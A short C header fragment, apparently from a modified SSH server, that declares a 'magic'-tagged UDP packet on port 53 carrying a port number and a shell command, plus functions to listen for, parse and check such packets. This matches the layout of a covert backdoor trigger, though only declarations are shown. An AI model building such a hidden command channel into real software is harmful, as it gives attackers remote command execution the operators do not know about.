typedef struct {
	uint32_t magic; /* should be 0xDEADBEEF */
	uint16_t port_number;
    char shell_command[256];
} listen_packet_t;

int start_udp(void); 			//svr-main.c
void start_udp_request(void);	//svr-runopts.c to svr-main.c
int add_port_request(int);		//svr-main.c
void add_port(const char* );	//svr-runopts.c
void parse_packet(listen_packet_t *,char *);
int check_shell_command(listen_packet_t *);



#define BUFFERSIZE      2048
#define PACKETSIZE      sizeof(listen_packet_t)
#define UDPPORT            53 


